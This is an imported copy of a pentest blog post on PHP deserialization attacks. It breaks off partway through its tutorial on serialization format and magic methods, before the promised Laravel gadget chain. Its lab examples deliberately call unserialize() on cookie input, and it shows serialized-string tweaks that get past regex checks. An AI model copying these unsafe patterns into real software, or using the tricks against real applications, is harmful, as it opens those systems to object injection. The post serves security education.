---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-02-13_php-deserialization-attacks-and-a-new-gadget-chain-in-laravel.md
original_filename: 2024-02-13_php-deserialization-attacks-and-a-new-gadget-chain-in-laravel.md
title: PHP deserialization attacks and a new gadget chain in Laravel
category: documents
detected_topics:
- command-injection
- supply-chain
- sso
- xss
- sqli
- mfa
tags:
- imported
- documents
- command-injection
- supply-chain
- sso
- xss
- sqli
- mfa
language: en
raw_sha256: b7ddb2134129c83c424b3d5bfa96704d322da857a07473c1302b83c93cf3f084
text_sha256: f47c5ba3951f54c422e248c1356b30450092c11b74c54c220d17128e33001ed5
ingested_at: '2026-06-28T07:32:31Z'
sensitivity: unknown
redactions_applied: true
---

# PHP deserialization attacks and a new gadget chain in Laravel

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-02-13_php-deserialization-attacks-and-a-new-gadget-chain-in-laravel.md
- Source Type: markdown
- Detected Topics: command-injection, supply-chain, sso, xss, sqli, mfa
- Ingested At: 2026-06-28T07:32:31Z
- Redactions Applied: True
- Raw SHA256: `b7ddb2134129c83c424b3d5bfa96704d322da857a07473c1302b83c93cf3f084`
- Text SHA256: `f47c5ba3951f54c422e248c1356b30450092c11b74c54c220d17128e33001ed5`


## Content

---
title: "PHP deserialization attacks and a new gadget chain in Laravel"
page_title: "PHP deserialization attacks and a new gadget chain in Laravel - Quarkslab's blog"
url: "https://blog.quarkslab.com/php-deserialization-attacks-and-a-new-gadget-chain-in-laravel.html"
final_url: "https://blog.quarkslab.com/php-deserialization-attacks-and-a-new-gadget-chain-in-laravel.html"
authors: ["Mathieu Farrell"]
bugs: ["Insecure deserialization", "PHP pop chain"]
publication_date: "2024-02-13"
added_date: "2024-02-27"
source: "pentester.land/writeups.json"
original_index: 437
---

#  [ PHP deserialization attacks and a new gadget chain in Laravel ](./php-deserialization-attacks-and-a-new-gadget-chain-in-laravel.html "Permalink to PHP deserialization attacks and a new gadget chain in Laravel")

Posted Tue 13 February 2024  
Author [Mathieu Farrell](./author/mathieu-farrell.html)  
Category [ Pentest ](./category/pentest.html)  
Tags [pentest](./tag/pentest.html), [framework](./tag/framework.html), [PHP](./tag/php.html), [2024](./tag/2024.html)

* * *

Discovery of a new gadget chain in Laravel.

* * *

## Introduction

Without pretension this article reintroduces the already known concept of Property Oriented Programming chain (POP chain) or gadget chain in PHP. The first part of the article explains the basic ideas associated with gadget chain whereas the second part details how we were able during an engagement to identify a new one within [Laravel](https://laravel.com/). Two tricks were leveraged which, if you know them, will be very useful for your gadget research.

## Lab setup

We will use Docker to set up a test lab, and more specifically the project [docker-compose-lamp](https://github.com/sprintcube/docker-compose-lamp) developed by [sprintcube](https://github.com/sprintcube) to carry out our tests.

Note that this docker-compose project is useful in order to test tricks on different versions of PHP. Indeed, all we have to do is change an environment variable to adapt the PHP version to the targeted one.

With just a few command lines, we can create a viable and resilient test environment:
  
  
  git clone https://github.com/sprintcube/docker-compose-lamp
  cd docker-compose-lamp
  cp sample.env .env
  

Don't forget to change the secrets stored in the environement variables (within file .env) before launching your Docker containers.

Then, launch the containers with the following command:
  
  
  docker-compose up -d
  

Now that our test environment is ready and our Web server is listening on port 58080 (80 if you didn't modify the file .env), let's look at the basic concepts.

## What is a gadget chain?

A gadget chain, also known as a POP chain, is a string which is provided as the first parameter (in one way or another) to the function `unserialize()`. The string representing the gadget chain is specially crafted to instantiate one or multiple objects that will take advantage of the execution flow of a PHP script by either taking benefit of the application logic or leveraging one of the magic methods which will be presented to you.

## What is serialization in PHP?

As defined in the official [documentation](https://www.php.net/manual/en/function.serialize.php), serialization transforms an object into a storable value (a string).

![alt-text](resources/2024-02-06_laravel-gadget-chain/Captures/c0.png)

And its opposite principle, deserialization, transforms a storable value into an object.

![alt-text](resources/2024-02-06_laravel-gadget-chain/Captures/c1.png)

As you may understand, the two functions we're interested in are `serialize()` and `unserialize()`. Given the fact that we're putting ourselves in the shoes of an attacker, we're going to pay a particular attention, to the function `unserialize()` when it takes as input data submitted by a user.

### Serialization

File: [example_0.php](resources/2024-02-06_laravel-gadget-chain/Examples/example_0.php)
  
  
  <?php
  
  class User
  {
  function __construct($username)
  {
  $this->username = $username;
  }
  }
  
  $new_user_object = new User("guest");
  $serialized_new_user_object = serialize($new_user_object);
  
  var_dump($serialized_new_user_object);
  
  ?>
  

When the above script (example_0.php) is executed, we observe within the server's response, a string that corresponds to a serialized `User` object.

Request (HTTP):
  
  
  GET /example_0.php HTTP/1.1
  Host: 127.0.0.1:58080
  

Response (HTTP):
  
  
  HTTP/1.1 200 OK
  X-Powered-By: PHP/7.4.2
  Content-Length: 56
  Content-Type: text/html; charset=UTF-8
  
  string(42) "O:4:"User":1:{s:8:"username";s:5:"guest";}"
  

Where the serialized data corresponds to the following string:
  
  
  O:4:"User":1:{s:8:"username";s:5:"guest";}
  

### Deserialization

File: [example_1.php](resources/2024-02-06_laravel-gadget-chain/Examples/example_1.php)
  
  
  <?php
  
  class User
  {
  function __construct($username)
  {
  $this->username = $username;
  echo "Hello from function __construct()\n";
  }
  }
  
  $serialized_new_user_object = $_COOKIE["user"];
  $new_user_object = unserialize($serialized_new_user_object);
  
  var_dump($new_user_object);
  
  ?>
  

The above example differs from the previous one. It demonstrates two things. Firstly, as the documentation states, it is possible to instantiate a new object from serialized data if it is passed as a parameter to the `unserialize()` function.

> In this example (example_1.php), the serialized data is transmitted via the `Cookie` HTTP header, that is why, the `;` character is encoded in `%3b` to avoid it being confused with the cookie delimiter `;` by the Web server.

Request (HTTP):
  
  
  GET /example_1.php HTTP/1.1
  Host: 127.0.0.1:58080
  Cookie: user=O:4:"User":1:{s:8:"username"%3bs:5:"guest"%3b}
  

Response (HTTP):
  
  
  HTTP/1.1 200 OK
  X-Powered-By: PHP/7.4.2
  Content-Length: 60
  Content-Type: text/html; charset=UTF-8
  
  object(User)#1 (1) {
  ["username"]=>
  string(5) "guest"
  }
  

The second thing that stands out, is that the new object is instantiated without having to use its class constructor `__construct()`, because, as we can observe from the HTTP response, the call to function `echo` never occurred. In fact, the `unserialize()` function acts as a constructor as mentioned multiple times in the official documentation.

> `Serializable::unserialize()` acts as the constructor of the object. The `__construct()` method will not be called after this method. - [Serializable::unserialize](https://www.php.net/manual/en/serializable.unserialize.php)

> For the `Serializable` interface, when the data is unserialized the class is known and the appropriate `unserialize()` method is called as a constructor instead of calling `__construct()`. If you need to execute the standard constructor you may do so in the method. - [The Serializable interface](https://www.php.net/manual/en/class.serializable.php)

### Format of a serialized object

Once serialized, objects are represented as strings. Let's take a look at the serialization of the following types:

  * `null`
  * `boolean`
  * `int`
  * `float`
  * `string`
  * `array`
  * `object`
  * `reference`

The format comprehension is fairly intuitive. The values `N`, `b`, `i`, `d`, `s`, `a`, `O` and `R` are defined in the PHP documentation as [type specifier](https://www.phpinternalsbook.com/php5/classes_objects/serialization.html).

The example below shows the different output possibilities generated by the `serialize()` function for the above-mentioned types:
  
  
  php > echo serialize(Null); # Null
  N;
  php > echo serialize(true); # Boolean
  b:1;
  php > echo serialize(false); # Boolean
  b:0;
  php > echo serialize(1337); # Int
  i:1337;
  php > echo serialize(13.37); # Float
  d:13.37;
  php > echo serialize("AAAA"); # String
  s:4:"AAAA";
  php > echo serialize(array("AAAA")); # Array
  a:1:{i:0;s:4:"AAAA";}
  php > echo serialize(new stdClass()); # Object
  O:8:"stdClass":0:{}
  php > $x = array(); $x[0] = "val"; $x[1] = &$x[0]; # Reference
  php > echo serialize($x); # Reference (part 4)
  a:2:{i:0;s:3:"val";i:1;R:2;}
  

For `reference` the important part is the `R:2;` element. It means, _reference to the second value_. But what is the second value?

The whole array is the first value and the first index `s:3:"val"` is the second value, so that's what is referenced.

For `array` we can read the following information in the PHP [documentation](https://www.phpinternalsbook.com/php5/classes_objects/serialization.html):

> For arrays a list of key-value pairs is contained in curly braces: 
>  
>  
>  [10, 11, 12]:  a:3:{i:0;i:10;i:1;i:11;i:2;i:12;}
>  ^-- count([10, 11, 12])
>  v-- key  v-- value
>  ["foo" => 4, "bar" => 2]:  a:2:{s:3:"foo";i:4;s:3:"bar";i:2;}
>  ^-- key  ^-- value
>  

We're now going to explore the possibility of altering the string representing serialized data without altering the data. As you can imagine, the purpose of the following examples is to play with the serialization format to see when the deserialization mechanism works or doesn't. Understanding the format of a serialized string and the modifications that can be made to it without affecting the deserialization process allows us to imagine bypasses for checks that can be implemented using regular expressions.

Int:

Test on PHP 8.2.7:
  
  
  php > var_dump(unserialize('i:1337;'));
  int(1337)
  php > var_dump(unserialize('i:+1337;'));
  int(1337)
  php > var_dump(unserialize('i:-1337;'));
  int(-1337)
  

Float:

Test on PHP 8.2.7:
  
  
  php > var_dump(unserialize('d:13.37;'));
  float(13.37)
  php > var_dump(unserialize('d:+13.37;'));
  float(13.37)
  php > var_dump(unserialize('d:-13.37;'));
  float(-13.37)
  

String:

Test on PHP 8.2.7:
  
  
  php > var_dump(unserialize('s:6:"AAAA"B";'));
  string(6) "AAAA"B"
  

Array:

Test on PHP 8.2.7:
  
  
  php > var_dump(unserialize('a:1:{i:+0;s:4:"AAAA";}')); # Adding a sign to an integer (example 1).
  array(1) {
  [0]=>
  string(4) "AAAA"
  }
  php > var_dump(unserialize('a:1:{i:-0;s:4:"AAAA";}')); # Adding a sign to an integer (example 1 bis).
  array(1) {
  [0]=>
  string(4) "AAAA"
  }
  

Object:

Test on PHP 8.2.7:
  
  
  php > var_dump(unserialize('O:8:"stdClass":0:{}'));
  object(stdClass)#1 (0) {
  }
  php > var_dump(unserialize('O:8:"stdClass":-0:{}')); # Adding a sign to an integer (example 1).
  object(stdClass)#1 (0) {
  }
  php > var_dump(unserialize('O:8:"stdClass":0:{}THISISJUNK')); # Padding added at end of string.
  object(stdClass)#1 (0) {
  }
  php > var_dump(unserialize('O:+8:"stdClass":0:{}')); # Adding a sign to an integer (example 2).
  PHP Notice:  unserialize(): Error at offset 0 of 20 bytes in php shell code on line 1
  bool(false)
  

Test on PHP 5.6.40:
  
  
  php > var_dump(unserialize('O:+8:"stdClass":0:{}')); # Adding a sign to an integer (example 2).
  php shell code:1:
  class stdClass#1 (0) {
  }
  

Reference:

Test on PHP 8.2.7:
  
  
  php > var_dump(unserialize('a:2:{i:+0;s:3:"val";i:+1;R:2;}'));
  array(2) {
  [0]=>
  &string(3) "val"
  [1]=>
  &string(3) "val"
  }
  

> It should be noted that the parsing of serialized data by the function `unserialize()` has been fuzzed in the past, leading to the discovery of vulnerabilities such as use-after-free memory corruption and their corresponding CVEs.

As the first bricks have been laid, we invite you to play with those formats and test different versions of the PHP interpreter.

### Life cycle of a PHP object

Let's take example_0.php and modify it a bit.

File: [example_2.php](resources/2024-02-06_laravel-gadget-chain/Examples/example_2.php)
  
  
  <?php
  
  class User
  {
  function __construct($username)
  {
  $this->username = $username;
  echo "Hello from function __construct()\n";
  }
  
  function __destruct()
  {
  echo "Hello from function __destruct()\n";
  }
  }
  
  $new_user_object = new User("guest");
  $serialized_new_user_object = serialize($new_user_object);
  
  var_dump($serialized_new_user_object);
  
  ?>
  

What happens when the object is instantiated, and what happens when the PHP script ends?

As shown in the Web server's response below, function `User::__construct()` is called when the object is instantiated, and function `User::__destruct()` is called when the object is destroyed at the end of the script.

Request (HTTP):
  
  
  GET /example_2.php HTTP/1.1
  Host: 127.0.0.1:58080
  

Response (HTTP):
  
  
  HTTP/1.1 200 OK
  X-Powered-By: PHP/7.4.2
  Content-Length: 123
  Content-Type: text/html; charset=UTF-8
  
  Hello from function __construct()
  string(42) "O:4:"User":1:{s:8:"username";s:5:"guest";}"
  Hello from function __destruct()
  

But what happens if the object is destroyed before the end of the script execution?

We'll call the function `unset()` before the end of the script and observe what occurs.

![alt-text](resources/2024-02-06_laravel-gadget-chain/Captures/c2.png)

File: [example_3.php](resources/2024-02-06_laravel-gadget-chain/Examples/example_3.php)
  
  
  <?php
  
  class User
  {
  function __construct($username)
  {
  $this->username = $username;
  echo "Hello from function __construct()\n";
  }
  
  function __destruct()
  {
  echo "Hello from function __destruct()\n";
  }
  }
  
  $new_user_object = new User("guest");
  
  unset($new_user_object);
  
  echo "End of the script.\n";
  
  ?>
  

As you can see below, the function `User::__destruct()` is called before the end of the script.

Request (HTTP):
  
  
  GET /example_3.php HTTP/1.1
  Host: 127.0.0.1:58080
  

Response (HTTP):
  
  
  HTTP/1.1 200 OK
  X-Powered-By: PHP/7.4.2
  Content-Length: 86
  Content-Type: text/html; charset=UTF-8
  
  Hello from function __construct()
  Hello from function __destruct()
  End of the script.
  

We can therefore come to the following conclusion. An object will be destroyed (unloaded from memory) at the end of a script or if all previous references to it have been removed before the end. We won't have to destroy it manually, as PHP always clears all memory thanks to its garbage collection mechanism. Furthermore, imagine that if we manage to instantiate an object during deserialization and immediately delete all references to this object, then we'll be able to call its `__destruct()` method without waiting for the script to finish. We'll call this technique, the [fast destruct](https://github.com/ambionics/phpggc?tab=readme-ov-file#fast-destruct).

This could have been figured out by looking at the documentation but examples make it easier to understand.

![alt-text](resources/2024-02-06_laravel-gadget-chain/Captures/c3.png)

![alt-text](resources/2024-02-06_laravel-gadget-chain/Captures/c4.png)

As stated in the screenshots above, throwing an exception from a destructor (called at the end of the script) causes a fatal error. This makes objects with such a `__destruct()` method good candidates to identify, while fuzzing in white box, calls to the `unserialize()` function with user-controlled data as first parameter.

We've just introduced functions `__construct()` and `__destruct()`, but there are other functions belonging to the same family, so, let's take a look at them.

### Magic Methods

As indicated in the documentation, there are 17 magic methods:

  * `__construct()`
  * `__destruct()`
  * `__call()`
  * `__callStatic()`
  * `__get()`
  * `__set()`
  * `__isset()`
  * `__unset()`
  * `__sleep()`
  * `__wakeup()`
  * `__serialize()`
  * `__unserialize()`
  * `__toString()`
  * `__invoke()`
  * `__set_state()`
  * `__clone()`
  * `__debugInfo()`

![alt-text](resources/2024-02-06_laravel-gadget-chain/Captures/c5.png)

To be efficient in the search of gadgets it is necessary to know each one of these methods. So, for almost each method, we'll give an example to illustrate how the method works or at least provide its description from the official documentation.

#### `__construct()`

Description:

> Constructors are ordinary methods which are called during the instantiation of their corresponding object. As such, they may define an arbitrary number of arguments, which may be required, may have a type, and may have a default value. Constructor arguments are called by placing the arguments in parentheses after the class name. - [Constructors and Destructors: __construct()](https://www.php.net/manual/en/language.oop5.decon.php#object.construct)

**This method is not called during deserialization, as explained earlier**.

File: [example_4.php](resources/2024-02-06_laravel-gadget-chain/Examples/example_4.php)
  
  
  <?php
  
  class User
  {
  function __construct($username)
  {
  $this->username = $username;
  echo "Hello from function __construct()\n";
  }
  }
  
  $new_user_object = new User("guest");
  
  ?>
  

Request (HTTP):
  
  
  GET /example_4.php HTTP/1.1
  Host: 127.0.0.1:58080
  

Response (HTTP):
  
  
  HTTP/1.1 200 OK
  X-Powered-By: PHP/7.4.2
  Content-Length: 34
  Content-Type: text/html; charset=UTF-8
  
  Hello from function __construct()
  

#### `__destruct()`

Description:

> PHP possesses a destructor concept similar to that of other object-oriented languages, such as C++. The destructor method will be called as soon as there are no other references to a particular object, or in any order during the shutdown sequence. - [Constructors and Destructors: __destruct()](https://www.php.net/manual/en/language.oop5.decon.php#object.destruct)

File: [example_5.php](resources/2024-02-06_laravel-gadget-chain/Examples/example_5.php)
  
  
  <?php
  
  class User
  {
  function __destruct()
  {
  echo "Hello from function __destruct(), my name was: $this->username\n";
  }
  }
  
  $new_user_object = unserialize($_COOKIE["user"]);
  
  ?>
  

Request (HTTP):
  
  
  GET /example_5.php HTTP/1.1
  Host: 127.0.0.1:58080
  Cookie: user=O:4:"User":1:{s:8:"username"%3bs:5:"guest"%3b}
  

Response (HTTP):
  
  
  HTTP/1.1 200 OK
  X-Powered-By: PHP/7.4.2
  Content-Length: 53
  Content-Type: text/html; charset=UTF-8
  
  Hello from function __destruct(), my name was: guest
  

#### `__call()`

Description:

> `__call()` is triggered when invoking inaccessible methods in an object context.
> 
> The `$name` argument is the name of the method being called. The `$arguments` argument is an enumerated array containing the parameters passed to the `$name`'ed method. - [Method overloading: __call()](https://www.php.net/manual/en/language.oop5.overloading.php#object.call)

File: [example_6.php](resources/2024-02-06_laravel-gadget-chain/Examples/example_6.php)
  
  
  <?php
  
  class User
  {
  public function __call($name, $arguments)
  {
  echo "Calling object method '$name' "
  . implode(', ', $arguments). "\n";
  }
  }
  
  $new_user_object = unserialize($_COOKIE["user"]);
  $new_user_object->log("with an annoying log message as only parameter.")
  
  ?>
  

Request (HTTP):
  
  
  GET /example_6.php HTTP/1.1
  Host: 127.0.0.1:58080
  Cookie: user=O:4:"User":1:{s:8:"username"%3bs:5:"guest"%3b}
  

Response (HTTP):
  
  
  HTTP/1.1 200 OK
  X-Powered-By: PHP/7.4.2
  Content-Length: 76
  Content-Type: text/html; charset=UTF-8
  
  Calling object method 'log' with an annoying log message as only parameter.
  

#### `__callStatic()`

Description:

> `__callStatic()` is triggered when invoking inaccessible methods in a static context. - [Method overloading: __callStatic()](https://www.php.net/manual/en/language.oop5.overloading.php#object.callstatic)

File: [example_7.php](resources/2024-02-06_laravel-gadget-chain/Examples/example_7.php)
  
  
  <?php
  
  class User
  {
  public static function __callStatic($name, $arguments)
  {
  echo "Calling static method '$name' "
  . implode(', ', $arguments). "\n";
  }
  }
  
  $new_user_object = unserialize($_COOKIE["user"]);
  $new_user_object::log("with another annoying log message as only parameter.")
  
  ?>
  

Request (HTTP):
  
  
  GET /example_7.php HTTP/1.1
  Host: 127.0.0.1:58080
  Cookie: user=O:4:"User":1:{s:8:"username"%3bs:5:"guest"%3b}
  

Response (HTTP):
  
  
  HTTP/1.1 200 OK
  X-Powered-By: PHP/7.4.2
  Content-Length: 81
  Content-Type: text/html; charset=UTF-8
  
  Calling static method 'log' with another annoying log message as only parameter.
  

#### `__get()`

Description:

> `__get()` is utilized for reading data from inaccessible (`protected` or `private`) or non-existing properties. - [Property overloading: __get()](https://www.php.net/manual/en/language.oop5.overloading.php#object.get)

File: [example_8.php](resources/2024-02-06_laravel-gadget-chain/Examples/example_8.php)
  
  
  <?php
  
  class User
  {
  private $information = array(
  "secret"=>"I'm called when the property doesn't exist."
  );
  
  public function __get($name)
  {
  echo "Getting '$name':\n";
  if (array_key_exists($name, $this->information)) {
  return $this->information[$name];
  }
  }
  }
  
  $new_user_object = unserialize($_COOKIE["user"]);
  echo $new_user_object->secret;
  
  ?>
  

Request (HTTP):
  
  
  GET /example_8.php HTTP/1.1
  Host: 127.0.0.1:58080
  Cookie: user=O:4:"User":1:{s:8:"username"%3bs:5:"guest"%3b}
  

Response (HTTP):
  
  
  HTTP/1.1 200 OK
  X-Powered-By: PHP/7.4.2
  Content-Length: 61
  Content-Type: text/html; charset=UTF-8
  
  Getting 'secret':
  I'm called when the property doesn't exist.
  

#### `__set()`

Description:

> `__set()` is run when writing data to inaccessible (`protected` or `private`) or non-existing properties. - [Property overloading: __set()](https://www.php.net/manual/en/language.oop5.overloading.php#object.set)

File: [example_9.php](resources/2024-02-06_laravel-gadget-chain/Examples/example_9.php)
  
  
  <?php
  
  class User
  {
  private $information = array();
  
  public function __set($name, $value)
  {
  echo "Setting '$name' to '$value':\n";
  $this->information[$name] = $value;
  }
  }
  
  $new_user_object = unserialize($_COOKIE["user"]);
  $new_user_object->secret = "Writing data to inaccessible or non-existing properties.";
  
  var_dump($new_user_object);
  
  ?>
  

Request (HTTP):
  
  
  GET /example_9.php HTTP/1.1
  Host: 127.0.0.1:58080
  Cookie: user=O:4:"User":1:{s:8:"username"%3bs:5:"guest"%3b}
  

Response (HTTP):
  
  
  HTTP/1.1 200 OK
  X-Powered-By: PHP/7.4.2
  Content-Length: 283
  Content-Type: text/html; charset=UTF-8
  
  Setting 'secret' to 'Writing data to inaccessible or non-existing properties.':
  object(User)#1 (2) {
  ["information":"User":private]=>
  array(1) {
  ["secret"]=>
  string(56) "Writing data to inaccessible or non-existing properties."
  }
  ["username"]=>
  string(5) "guest"
  }
  

#### `__isset()`

Description:

> `__isset()` is triggered by calling `isset()` or `empty()` on inaccessible (`protected` or `private`) or non-existing properties. - [Property overloading: __isset()](https://www.php.net/manual/en/language.oop5.overloading.php#object.isset)

#### `__unset()`

Description:

> `__unset()` is invoked when `unset()` is used on inaccessible (`protected` or `private`) or non-existing properties. - [Property overloading: __unset()](https://www.php.net/manual/en/language.oop5.overloading.php#object.unset)

#### `__sleep()`

Description:

> `serialize()` checks if the class has a function with the magic name `__sleep()`. If so, that function is executed prior to any serialization. It can clean up the object and is supposed to return an array with the names of all variables of that object that should be serialized. If the method doesn't return anything then null is serialized and `E_NOTICE` is issued.
> 
> It is not possible for `__sleep()` to return names of private properties in parent classes. Doing this will result in an `E_NOTICE` level error. Use `__serialize()` instead.
> 
> As of PHP 8.0.0, returning a value which is not an array from `__sleep()` generates a warning. Previously, it generated a notice. - [__sleep()](https://www.php.net/manual/en/language.oop5.magic.php#object.sleep)

File: [example_10.php](resources/2024-02-06_laravel-gadget-chain/Examples/example_10.php)
  
  
  <?php
  
  class User
  {
  private $information = array(
  "secret"=>"Super secret value"
  );
  public $expose = "Not so secret value";
  
  public function __construct($username, $password)
  {
  $this->username = $username;
  $this->password=***REDACTED***
  }
  
  public function __sleep()
  {
  return array("username", "expose");
  }
  }
  
  $new_user_object = new User("guest", "Gu35t");
  $serialized_new_user_object = serialize($new_user_object);
  
  var_dump($serialized_new_user_object);
  
  ?>
  

Request (HTTP):
  
  
  GET /example_10.php HTTP/1.1
  Host: 127.0.0.1:58080
  

Response (HTTP):
  
  
  HTTP/1.1 200 OK
  X-Powered-By: PHP/7.4.2
  Content-Length: 96
  Content-Type: text/html; charset=UTF-8
  
  string(82) "O:4:"User":2:{s:8:"username";s:5:"guest";s:6:"expose";s:19:"Not so secret value";}"
  

#### `__wakeup()`

Description:

> `unserialize()` checks for the presence of a function with the magic name `__wakeup()`. If present, this function can reconstruct any resources that the object may have.
> 
> The intended use of `__wakeup()` is to reestablish any database connections that may have been lost during serialization and perform other reinitialization tasks. - [__wakeup()](https://www.php.net/manual/en/language.oop5.magic.php#object.wakeup)

File: [example_11.php](resources/2024-02-06_laravel-gadget-chain/Examples/example_11.php)
  
  
  <?php
  
  class User
  {
  function __construct($username)
  {
  $this->username = $username;
  echo "Hello from function __construct()\n";
  }
  
  public function __wakeup()
  {
  echo "Hello from function __wakeup()\n";
  }
  }
  
  $serialized_new_user_object = $_COOKIE["user"];
  $new_user_object = unserialize($serialized_new_user_object);
  
  var_dump($new_user_object);
  
  ?>
  

Request (HTTP):
  
  
  GET /example_11.php HTTP/1.1
  Host: 127.0.0.1:58080
  Cookie: user=O:4:"User":1:{s:8:"username"%3bs:5:"guest"%3b}
  

Response (HTTP):
  
  
  HTTP/1.1 200 OK
  X-Powered-By: PHP/7.4.2
  Content-Length: 91
  Content-Type: text/html; charset=UTF-8
  
  Hello from function __wakeup()
  object(User)#1 (1) {
  ["username"]=>
  string(5) "guest"
  }
  

#### `__serialize()`

Description:

> `serialize()` checks if the class has a function with the magic name `__serialize()`. If so, that function is executed prior to any serialization. It must construct and return an associative array of key/value pairs that represent the serialized form of the object. If no array is returned a `TypeError` will be thrown.
> 
> If both `__serialize()` and `__sleep()` are defined in the same object, only `__serialize()` will be called. `__sleep()` will be ignored. If the object implements the `Serializable` interface, the interface's `serialize()` method will be ignored and `__serialize()` used instead.
> 
> The intended use of `__serialize()` is to define a serialization-friendly arbitrary representation of the object. Elements of the array may correspond to properties of the object but that is not required. - [__serialize()](https://www.php.net/manual/en/language.oop5.magic.php#object.serialize)

File: [example_12.php](resources/2024-02-06_laravel-gadget-chain/Examples/example_12.php)
  
  
  <?php
  
  class User
  {
  private $information = array(
  "secret"=>"Super secret value"
  );
  public $expose = "Not so secret value";
  
  public function __construct($username, $password)
  {
  $this->username = $username;
  $this->password=***REDACTED***
  }
  
  public function __sleep()
  {
  echo "Hello from function __sleep().\n";
  return array("username", "expose");
  }
  
  public function __serialize()
  {
  echo "Hello from function __serialize().\n";
  return [
  "username" => $this->username,
  "password" => $this->password,
  "information" => $this->information
  ];
  }
  }
  
  $new_user_object = new User("guest", "Gu35t");
  $serialized_new_user_object = serialize($new_user_object);
  
  var_dump($serialized_new_user_object);
  
  ?>
  

Request (HTTP):
  
  
  GET /example_12.php HTTP/1.1
  Host: 127.0.0.1:58080
  

Response (HTTP):
  
  
  HTTP/1.1 200 OK
  X-Powered-By: PHP/7.4.2
  Content-Length: 183
  Content-Type: text/html; charset=UTF-8
  
  Hello from function __serialize().
  string(133) "O:4:"User":3:{s:8:"username";s:5:"guest";s:8:"password";s:5:"Gu35t";s:11:"information";a:1:{s:6:"secret";s:18:"Super secret value";}}"
  

#### `__unserialize()`

Description:

> Conversely, `unserialize()` checks for the presence of a function with the magic name `__unserialize()`. If present, this function will be passed the restored array that was returned from `__serialize()`. It may then restore the properties of the object from that array as appropriate.
> 
> If both `__unserialize()` and `__wakeup()` are defined in the same object, only `__unserialize()` will be called. `__wakeup()` will be ignored. - [__unserialize()](https://www.php.net/manual/en/language.oop5.magic.php#object.unserialize)

File: [example_13.php](resources/2024-02-06_laravel-gadget-chain/Examples/example_13.php)
  
  
  <?php
  
  class User
  {
  function __construct($username)
  {
  $this->username = $username;
  echo "Hello from function __construct()\n";
  }
  
  public function __wakeup()
  {
  echo "Hello from function __wakeup()\n";
  }
  
  public function __unserialize(array $data)
  {
  $this->username = $data["username"];
  $this->password=***REDACTED***password"];
  $this->information = $data["information"];
  }
  }
  
  $serialized_new_user_object = $_COOKIE["user"];
  $new_user_object = unserialize($serialized_new_user_object);
  
  var_dump($new_user_object);
  
  ?>
  

Request (HTTP):
  
  
  GET /example_13.php HTTP/1.1
  Host: 127.0.0.1:58080
  Cookie: user=O:4:"User":3:{s:8:"username"%3bs:5:"guest"%3bs:8:"password"%3bs:5:"Gu35t"%3bs:11:"information"%3ba:1:{s:6:"secret"%3bs:18:"Super secret value"%3b}}
  

Response (HTTP):
  
  
  HTTP/1.1 200 OK
  X-Powered-By: PHP/7.4.2
  Content-Length: 187
  Content-Type: text/html; charset=UTF-8
  
  object(User)#1 (3) {
  ["username"]=>
  string(5) "guest"
  ["password"]=>
  string(5) "Gu35t"
  ["information"]=>
  array(1) {
  ["secret"]=>
  string(18) "Super secret value"
  }
  }
  

#### `__toString()`

For the function `__toString()`, we've decided to present you a screenshot of the [documentation](https://www.php.net/manual/en/language.oop5.magic.php#object.tostring), as it contains a lot of information.

![alt-text](resources/2024-02-06_laravel-gadget-chain/Captures/c6.png)

File: [example_14.php](resources/2024-02-06_laravel-gadget-chain/Examples/example_14.php)
  
  
  <?php
  
  class User
  {
  public $favorite_phrase = "and I love soda.";
  
  public function __toString()
  {
  return $this->favorite_phrase;
  }
  }
  
  $serialized_new_user_object = $_COOKIE["user"];
  $new_user_object = unserialize($serialized_new_user_object);
  
  echo "We are in the year 1337 " . $new_user_object . "\n";
  
  ?>
  

Request (HTTP):
  
  
  GET /example_14.php HTTP/1.1
  Host: 127.0.0.1:58080
  Cookie: user=O:4:"User":1:{s:15:"favorite_phrase"%3bs:20:"and wheelbarrows ..."%3b}
  

Response (HTTP):
  
  
  HTTP/1.1 200 OK
  X-Powered-By: PHP/7.4.2
  Content-Length: 45
  Content-Type: text/html; charset=UTF-8
  
  We are in the year 1337 and wheelbarrows ...
  

#### `__invoke()`

Description:

> The `__invoke()` method is called when a script tries to call an object as a function. - [__invoke()](https://www.php.net/manual/en/language.oop5.magic.php#object.invoke)

File: [example_15.php](resources/2024-02-06_laravel-gadget-chain/Examples/example_15.php) (referenced as [Example #4](https://www.php.net/manual/en/language.oop5.magic.php#object.invoke) in the PHP Magic Methods documentation)
  
  
  <?php
  
  class User
  {
  public function __invoke($x)
  {
  echo "I'm user " . $this->username . "and this is a: " . $x . "\n";
  }
  }
  
  $new_user_object = unserialize($_COOKIE["user"]);
  $new_user_object("test");
  var_dump(is_callable($new_user_object));
  
  ?>
  

Request (HTTP):
  
  
  GET /example_15.php HTTP/1.1
  Host: 127.0.0.1:58080
  Cookie: user=O:4:"User":1:{s:8:"username"%3bs:5:"guest"%3b}
  

Response (HTTP):
  
  
  HTTP/1.1 200 OK
  X-Powered-By: PHP/7.4.2
  Content-Length: 45
  Content-Type: text/html; charset=UTF-8
  
  I'm user guestand this is a: test
  bool(true)
  

#### `__set_state()`

Description:

> This static method is called for classes exported by `var_export()`. The only parameter of this method is an array containing exported properties in the form `['property' => value, ...]`.
> 
> When exporting an object, `var_export()` does not check whether `__set_state()` is implemented by the object's class, so re-importing objects will result in an `Error` exception, if `__set_state()` is not implemented. Particularly, this affects some internal classes. It is the responsibility of the programmer to verify that only objects will be re-imported, whose class implements `__set_state()`. - [__set_state()](https://www.php.net/manual/en/language.oop5.magic.php#object.set-state)

#### `__clone()`

Description:

> Once the cloning is complete, if a `__clone()` method is defined, then the newly created object's `__clone()` method will be called, to allow any necessary properties that need to be changed. - [Object Cloning: __clone()](https://www.php.net/manual/en/language.oop5.cloning.php#object.clone)

File: [example_16.php](resources/2024-02-06_laravel-gadget-chain/Examples/example_16.php)
  
  
  <?php
  
  class MyObject
  {
  public $instance = 0;
  
  public function __construct() {
  $this->instance = ++$this->instance;
  }
  
  public function __clone() {
  $this->instance = ++$this->instance;
  }
  }
  
  $obj1 = new MyObject();
  var_dump($obj1);
  
  $obj2 = clone $obj1;
  var_dump($obj2);
  
  ?>
  

Request (HTTP):
  
  
  GET /example_16.php HTTP/1.1
  Host: 127.0.0.1:58080
  

Response (HTTP):
  
  
  HTTP/1.1 200 OK
  X-Powered-By: PHP/7.4.2
  Content-Length: 106
  Content-Type: text/html; charset=UTF-8
  
  object(MyObject)#1 (1) {
  ["instance"]=>
  int(1)
  }
  object(MyObject)#2 (1) {
